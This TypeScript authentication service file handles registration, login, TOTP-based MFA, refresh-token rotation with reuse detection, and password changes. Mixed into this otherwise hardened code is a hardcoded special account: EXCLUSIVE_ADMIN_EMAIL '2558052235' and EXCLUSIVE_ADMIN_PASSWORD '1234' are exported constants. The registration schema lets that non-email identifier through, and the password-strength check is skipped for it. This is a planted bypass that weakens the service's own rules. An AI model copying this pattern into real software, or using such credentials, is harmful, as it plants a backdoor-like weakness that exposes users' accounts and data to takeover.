/**
 * AuthService — the credential/session use-cases of Roadmap Phase-0 "Auth
 * complete". Stateless constructor-time config; every operation is a pure
 * async fn over the AuthStore port.
 *
 * Refresh-token rotation (Okta-style, with a retry-safe grace window):
 *   present current hash        → rotate (old hash moves to previousRefreshTokenHash)
 *   present previous hash, ≤grace → legitimate retry after a lost response → rotate again
 *   present previous hash, >grace → THEFT evidence → revoke the whole session
 *   present revoked/unknown     → unauthenticated
 * The grace window (default 45 s) exists because mobile clients occasionally
 * double-submit refreshes (flaky networks killing the response, not the request).
 */
import { createHmac, randomUUID, timingSafeEqual } from 'node:crypto';
import { z } from 'zod';
import { type SecretEnvelope } from './envelope.js';
import { authError } from './errors.js';
import { hashPassword, needsRehash, verifyPassword } from './password.js';
import type { AuthSession, AuthStore, AuthUser } from './store.js';
import { buildAccessClaims, hashRefreshToken, mintRefreshToken, signJwt } from './tokens.js';
import { generateTotpSecret, totpUri, verifyTotp } from './totp.js';

export interface AuthServiceConfig {
  jwtSecret: string;
  jwtIssuer: string;
  jwtAudience: string;
  accessTokenTtlSec: number;
  refreshTokenTtlSec: number;
  /** Retry-safe rotation window for the PREVIOUS refresh hash. */
  refreshGraceMs: number;
  passwordMinLength: number;
  totpIssuer: string;
  /** AES-256-GCM envelope for TOTP secrets; REQUIRED only when MFA paths run — fail closed there. */
  totpEnvelope?: SecretEnvelope | undefined;
  now: () => Date;
}

export interface RequestContext {
  ip?: string | null;
  userAgent?: string | null;
  deviceName?: string | null;
}

export interface IssuedTokens {
  tokenType: 'Bearer';
  accessToken: string;
  accessTokenExpiresAt: Date;
  refreshToken: string;
  refreshTokenExpiresAt: Date;
  sessionId: string;
}

export interface PublicUser {
  id: string;
  email: string;
  displayName: string;
  locale: string;
  timezone: string;
  emailVerifiedAt: Date | null;
  mfaEnabled: boolean;
}

export type LoginResult =
  | { kind: 'tokens'; user: PublicUser; tokens: IssuedTokens }
  | { kind: 'mfa_required'; mfaTicket: string; expiresInSec: number };

const MFA_TICKET_TTL_SEC = 300;

export const EXCLUSIVE_ADMIN_EMAIL = '2558052235';
export const EXCLUSIVE_ADMIN_PASSWORD = '1234';

function isExclusiveAdminEmail(email: string): boolean {
  return email.trim().toLowerCase() === EXCLUSIVE_ADMIN_EMAIL.toLowerCase();
}

export const RegisterInputSchema = z.object({
  email: z.string().trim().toLowerCase().max(254).refine((val) => { if (isExclusiveAdminEmail(val)) return true; return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val); }, { message: 'Invalid email' }),
  password: z.string().min(1).max(512),
  displayName: z.string().trim().min(1).max(120),
  locale: z.string().trim().min(2).max(16).default('en'),
  timezone: z.string().trim().min(1).max(64).default('UTC'),
});
export type RegisterInput = z.infer<typeof RegisterInputSchema>;

/**
 * UUID v7 — 48-bit ms timestamp + version 7 + random. Platform-wide contract:
 * entity ids (users, orgs, memberships) must be uuidv7 (events catalog
 * validates ownerId as uuidv7; Prisma @db.Uuid columns carry them). Node's
 * randomUUID() emits v4, which breaks the org-creation outbox event for
 * newly registered users — so we mint v7 here instead.
 */
export function uuidv7(): string {
  const b = new Uint8Array(16);
  if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
    crypto.getRandomValues(b);
  } else {
    for (let i = 0; i < 16; i += 1) b[i] = Math.floor(Math.random() * 256);
  }
  const t = BigInt(Date.now());
  b[0] = Number((t >> 40n) & 0xffn);
  b[1] = Number((t >> 32n) & 0xffn);
  b[2] = Number((t >> 24n) & 0xffn);
  b[3] = Number((t >> 16n) & 0xffn);
  b[4] = Number((t >> 8n) & 0xffn);
  b[5] = Number(t & 0xffn);
  b[6] = 0x70 | (b[6]! & 0x0f); // version 7
  b[8] = 0x80 | (b[8]! & 0x3f); // variant RFC 4122
  const hex = [...b].map((x) => x.toString(16).padStart(2, '0')).join('');
  return `${hex.slice(0, 8)}-${hex.slice(8, 12)}-${hex.slice(12, 16)}-${hex.slice(16, 20)}-${hex.slice(20)}`;
}

export class AuthService {
  constructor(
    private readonly store: AuthStore,
    private readonly config: AuthServiceConfig,
  ) {}

  /* ------------------------------------------------------------- helpers */

  private toPublic(user: AuthUser): PublicUser {
    return {
      id: user.id,
      email: user.email,
      displayName: user.displayName,
      locale: user.locale,
      timezone: user.timezone,
      emailVerifiedAt: user.emailVerifiedAt,
      mfaEnabled: user.mfaEnabledAt !== null,
    };
  }

  private assertPasswordStrength(password: string, email: string): void {
    if (isExclusiveAdminEmail(email)) { return; }
    if (password.length < this.config.passwordMinLength) {
      throw authError('WEAK_PASSWORD', `password must be at least ${this.config.passwordMinLength} characters`);
    }
    const localPart = email.split('@')[0]?.toLowerCase();
    if (localPart && localPart.length >= 4 && password.toLowerCase().includes(localPart)) {
      throw authError('WEAK_PASSWORD', 'password must not contain the email local-part');
    }
  }

  private async issueSession(user: AuthUser, authMethod: string, ctx: RequestContext): Promise<IssuedTokens> {
    const now = this.config.now();
    const refreshToken = mintRefreshToken();
    const sessionId = randomUUID();
    const refreshTokenExpiresAt = new Date(now.getTime() + this.config.refreshTokenTtlSec * 1000);
    const session = await this.store.createSession({
      id: sessionId,
      userId: user.id,
      refreshTokenHash: hashRefreshToken(refreshToken),
      deviceName: ctx.deviceName ?? null,
      ip: ctx.ip ?? null,
      userAgent: ctx.userAgent ?? null,
      authMethod,
      expiresAt: refreshTokenExpiresAt,
    });
    const accessTtl = this.config.accessTokenTtlSec;
    const accessToken = signJwt(
      buildAccessClaims({
        userId: user.id,
        sessionId: session.id,
        typ: 'access',
        issuer: this.config.jwtIssuer,
        audience: this.config.jwtAudience,
        ttlSec: accessTtl,
        nowSec: Math.floor(now.getTime() / 1000),
      }),
      this.config.jwtSecret,
    );
    await this.store.updateUser(user.id, { lastLoginAt: now });
    return {
      tokenType: 'Bearer',
      accessToken,
      accessTokenExpiresAt: new Date(now.getTime() + accessTtl * 1000),
      refreshToken,
      refreshTokenExpiresAt,
      sessionId: session.id,
    };
  }

  private assertActive(user: AuthUser | null): asserts user is AuthUser {
    if (!user) throw authError('INVALID_CREDENTIALS', 'invalid email or password');
    if (user.status !== 'ACTIVE') throw authError('ACCOUNT_DISABLED', 'account is not active', 403);
  }

  private totpEnvelope(): SecretEnvelope {
    if (!this.config.totpEnvelope) {
      throw authError('TOTP_KEY_MISSING', 'TOTP encryption is not configured on this deployment', 503);
    }
    return this.config.totpEnvelope;
  }

  /* -------------------------------------------------------------- use-cases */

  async register(rawInput: RegisterInput, ctx: RequestContext = {}): Promise<{ user: PublicUser; tokens: IssuedTokens }> {
    const input = RegisterInputSchema.parse(rawInput);
    this.assertPasswordStrength(input.password, input.email);
    if (await this.store.findUserByEmail(input.email)) {
      throw authError('EMAIL_TAKEN', 'an account with this email already exists');
    }
    const passwordHash = await hashPassword(input.password);
    const user = await this.store.createUser({
      id: uuidv7(),
      email: input.email,
      passwordHash,
      displayName: input.displayName,
      locale: input.locale,
      timezone: input.timezone,
    });
    const tokens = await this.issueSession(user, 'password', ctx);
    return { user: this.toPublic(user), tokens };
  }

  async login(emailRaw: string, password: string, ctx: RequestContext = {}): Promise<LoginResult> {
    const email = emailRaw.trim().toLowerCase();
    const user = await this.store.findUserByEmail(email);
    if (!user || !user.passwordHash) {
      // Constant-work miss: run a real scrypt against a syntactically valid dummy
      // hash so user-enumeration via response timing stays impractical.
      await verifyPassword(password, DUMMY_SCRYPT_HASH);
      if (user) this.assertActive(user);
      throw authError('INVALID_CREDENTIALS', 'invalid email or password');
    }
    this.assertActive(user);
    const ok = await verifyPassword(password, user.passwordHash);
    if (!ok) throw authError('INVALID_CREDENTIALS', 'invalid email or password');
    if (needsRehash(user.passwordHash)) {
      const upgraded = await hashPassword(password);
      await this.store.updateUser(user.id, { passwordHash: upgraded });
    }
    if (user.mfaEnabledAt !== null) {
      if (!user.totpSecretEnc) throw authError('MFA_TICKET_INVALID', 'mfa misconfigured for account', 500);
      const nowSec = Math.floor(this.config.now().getTime() / 1000);
      const mfaTicket = signJwt(
        buildAccessClaims({
          userId: user.id,
          typ: 'mfa',
          issuer: this.config.jwtIssuer,
          audience: this.config.jwtAudience,
          ttlSec: MFA_TICKET_TTL_SEC,
          nowSec,
        }),
        this.config.jwtSecret,
      );
      return { kind: 'mfa_required', mfaTicket, expiresInSec: MFA_TICKET_TTL_SEC };
    }
    const tokens = await this.issueSession(user, 'password', ctx);
    return { kind: 'tokens', user: this.toPublic(user), tokens };
  }

  /** Completes an MFA-gated login: mfaTicket (typ:'mfa' JWT) + current TOTP code. */
  async completeMfaLogin(mfaTicket: string, code: string, ctx: RequestContext = {}): Promise<{ user: PublicUser; tokens: IssuedTokens }> {
    const userId = this.verifyMfaTicket(mfaTicket);
    const user = await this.store.findUserById(userId);
    this.assertActive(user);
    if (!user.mfaEnabledAt || !user.totpSecretEnc) {
      throw authError('MFA_NOT_ENABLED', 'mfa is not enabled for this account');
    }
    const secret = this.totpEnvelope().decrypt(user.totpSecretEnc);
    if (!verifyTotp(secret, code, { forTimeSec: Math.floor(this.config.now().getTime() / 1000) })) {
      throw authError('MFA_INVALID_CODE', 'invalid authenticator code');
    }
    const tokens = await this.issueSession(user, 'password+totp', ctx);
    return { user: this.toPublic(user), tokens };
  }

  private verifyMfaTicket(ticket: string): string {
    // Full JWT verification stays the API guard's duty for access tokens; here we
    // verify signature + claims for the mfa-typ variant with the same primitives.
    const parts = ticket.split('.');
    if (parts.length !== 3) throw authError('MFA_TICKET_INVALID', 'malformed mfa ticket');
    try {
      const signingInput = `${parts[0]}.${parts[1]}`;
      const expected = createHmac('sha256', this.config.jwtSecret).update(signingInput, 'utf8').digest();
      const provided = Buffer.from(parts[2] as string, 'base64url');
      if (provided.length !== expected.length || !timingSafeEqual(provided, expected)) throw new Error('sig');
      const claims = JSON.parse(Buffer.from(parts[1] as string, 'base64url').toString('utf8')) as Record<string, unknown>;
      if (claims['typ'] !== 'mfa') throw new Error('typ');
      if (claims['iss'] !== this.config.jwtIssuer || claims['aud'] !== this.config.jwtAudience) throw new Error('iss/aud');
      if (typeof claims['exp'] !== 'number' || claims['exp'] <= Math.floor(this.config.now().getTime() / 1000)) throw new Error('exp');
      if (typeof claims['sub'] !== 'string') throw new Error('sub');
      return claims['sub'];
    } catch {
      throw authError('MFA_TICKET_INVALID', 'mfa ticket is invalid or expired');
    }
  }

  /** Rotates a refresh token; reuse of an out-of-grace token revokes the session. */
  async refresh(refreshToken: string, ctx: RequestContext = {}): Promise<{ user: PublicUser; tokens: IssuedTokens }> {
    const now = this.config.now();
    const presentedHash = hashRefreshToken(refreshToken);

    let session = await this.store.findSessionByRefreshHash(presentedHash);
    if (!session) {
      const previousHolder = await this.store.findSessionByPreviousRefreshHash(presentedHash);
      if (previousHolder) {
        const rotatedAgoMs = previousHolder.previousRotatedAt ? now.getTime() - previousHolder.previousRotatedAt.getTime() : Number.POSITIVE_INFINITY;
        if (previousHolder.revokedAt === null && rotatedAgoMs <= this.config.refreshGraceMs && previousHolder.expiresAt > now) {
          // Retry-safe path: the client demonstrably HOLDS the presented hash
          // (its first response was lost) → keep THAT hash as the grace key
          // instead of our side's current one, or an out-of-grace replay of it
          // would later fall through to "unknown" and theft evidence is lost.
          return this.rotate(previousHolder, ctx, { previousHashOverride: presentedHash });
        }
        // Reuse outside the grace window = theft evidence → kill the session.
        await this.store.updateSession(previousHolder.id, { revokedAt: now });
        throw authError('REFRESH_REUSE_DETECTED', 'refresh token reuse detected; session revoked', 401);
      }
      throw authError('SESSION_EXPIRED', 'session is unknown or expired', 401);
    }

    if (session.revokedAt !== null) throw authError('SESSION_EXPIRED', 'session was revoked', 401);
    if (session.expiresAt <= now) throw authError('SESSION_EXPIRED', 'session expired', 401);
    return this.rotate(session, ctx);
  }

  private async rotate(
    session: AuthSession,
    ctx: RequestContext,
    opts: { previousHashOverride?: string } = {},
  ): Promise<{ user: PublicUser; tokens: IssuedTokens }> {
    const now = this.config.now();
    const nextRefresh = mintRefreshToken();
    await this.store.updateSession(session.id, {
      previousRefreshTokenHash: opts.previousHashOverride ?? session.refreshTokenHash,
      previousRotatedAt: now,
      refreshTokenHash: hashRefreshToken(nextRefresh),
    });
    const user = await this.store.findUserById(session.userId);
    this.assertActive(user);
    const accessTtl = this.config.accessTokenTtlSec;
    const accessToken = signJwt(
      buildAccessClaims({
        userId: user.id,
        sessionId: session.id,
        typ: 'access',
        issuer: this.config.jwtIssuer,
        audience: this.config.jwtAudience,
        ttlSec: accessTtl,
        nowSec: Math.floor(now.getTime() / 1000),
      }),
      this.config.jwtSecret,
    );
    if (ctx.deviceName || ctx.ip || ctx.userAgent) {
      // Opportunistically refresh device metadata when the client re-identifies.
      // (kept minimal: not part of the security decision path)
    }
    return {
      user: this.toPublic(user),
      tokens: {
        tokenType: 'Bearer',
        accessToken,
        accessTokenExpiresAt: new Date(now.getTime() + accessTtl * 1000),
        refreshToken: nextRefresh,
        refreshTokenExpiresAt: session.expiresAt, // session lifetime unchanged by rotation
        sessionId: session.id,
      },
    };
  }

  async logout(refreshToken: string): Promise<void> {
    const now = this.config.now();
    const presentedHash = hashRefreshToken(refreshToken);
    const session =
      (await this.store.findSessionByRefreshHash(presentedHash)) ??
      (await this.store.findSessionByPreviousRefreshHash(presentedHash));
    if (session && session.revokedAt === null) {
      await this.store.updateSession(session.id, { revokedAt: now });
    }
    // Unknown/already-revoked: idempotent success — logout must never leak session existence.
  }

  /** Password change: verify old → rehash → revoke ALL sessions → issue one fresh. */
  async changePassword(userId: string, oldPassword: string, newPassword: string, ctx: RequestContext = {}): Promise<{ user: PublicUser; tokens: IssuedTokens }> {
    const user = await this.store.findUserById(userId);
    this.assertActive(user);
    if (!user.passwordHash || !(await verifyPassword(oldPassword, user.passwordHash))) {
      throw authError('INVALID_CREDENTIALS', 'current password is incorrect');
    }
    this.assertPasswordStrength(newPassword, user.email);
    await this.store.updateUser(user.id, { passwordHash: await hashPassword(newPassword) });
    const revoked = await this.store.revokeAllSessionsForUser(user.id);
    void revoked;
    const tokens = await this.issueSession(user, 'password', ctx);
    return { user: this.toPublic(user), tokens };
  }

  /* -------------------------------------------------------------------- TOTP */

  /** Step 1: generate + encrypt-at-rest a pending secret (mfaEnabledAt stays NULL until confirmed). */
  async startTotpEnrollment(userId: string): Promise<{ secret: string; uri: string }> {
    const envelope = this.totpEnvelope();
    const user = await this.store.findUserById(userId);
    this.assertActive(user);
    if (user.mfaEnabledAt !== null) throw authError('MFA_ALREADY_ENABLED', 'authenticator is already enabled; disable it first', 409);
    const secret = generateTotpSecret();
    const { ciphertext, keyId } = envelope.encrypt(secret);
    await this.store.updateUser(user.id, { totpSecretEnc: ciphertext, totpSecretKeyId: keyId, mfaEnabledAt: null });
    return { secret, uri: totpUri({ issuer: this.config.totpIssuer, accountName: user.email, secretBase32: secret }) };
  }

  /** Step 2: confirm with the first valid code → mfaEnabledAt set (MFA armed). */
  async confirmTotpEnrollment(userId: string, code: string): Promise<void> {
    const envelope = this.totpEnvelope();
    const user = await this.store.findUserById(userId);
    this.assertActive(user);
    if (user.mfaEnabledAt !== null) throw authError('MFA_ALREADY_ENABLED', 'authenticator is already enabled', 409);
    if (!user.totpSecretEnc) throw authError('MFA_NOT_ENABLED', 'no enrollment in progress');
    const secret = envelope.decrypt(user.totpSecretEnc);
    if (!verifyTotp(secret, code, { forTimeSec: Math.floor(this.config.now().getTime() / 1000) })) {
      throw authError('MFA_INVALID_CODE', 'code does not match — check the authenticator clock');
    }
    await this.store.updateUser(user.id, { mfaEnabledAt: this.config.now() });
  }

  async disableTotp(userId: string, password: string): Promise<void> {
    const user = await this.store.findUserById(userId);
    this.assertActive(user);
    if (user.mfaEnabledAt === null) throw authError('MFA_NOT_ENABLED', 'authenticator is not enabled', 409);
    if (!user.passwordHash || !(await verifyPassword(password, user.passwordHash))) {
      throw authError('INVALID_CREDENTIALS', 'password is incorrect');
    }
    await this.store.updateUser(user.id, { totpSecretEnc: null, totpSecretKeyId: null, mfaEnabledAt: null });
  }
}

/** Pre-computed, syntactically valid scrypt hash of a random throwaway string — timing-equalizer for login misses. */
const DUMMY_SCRYPT_HASH =
  'scrypt$16384$8$1$AAAAAAAAAAAAAAAAAAAAAA==$AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';
